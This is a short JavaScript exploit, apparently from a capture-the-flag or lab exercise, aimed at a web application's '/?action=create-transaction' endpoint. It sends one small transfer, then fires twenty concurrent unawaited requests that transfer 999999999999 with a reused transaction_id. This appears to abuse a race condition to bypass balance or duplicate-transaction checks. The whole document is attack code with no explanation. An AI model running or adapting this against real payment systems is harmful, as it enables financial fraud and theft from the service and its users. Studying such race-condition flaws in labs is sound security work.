(async () => {
    await fetch('/?action=create-transaction', {
      method: 'POST',
      body: 'recipient=birdbirdbird&amount=1',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
  
    for (let i = 0; i < 20; i++) {
      fetch('/?action=create-transaction', {
        method: 'POST',
        body: 'recipient=birdbirdbird&amount=999999999999&transaction_id=2',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });
    }
  })();
  
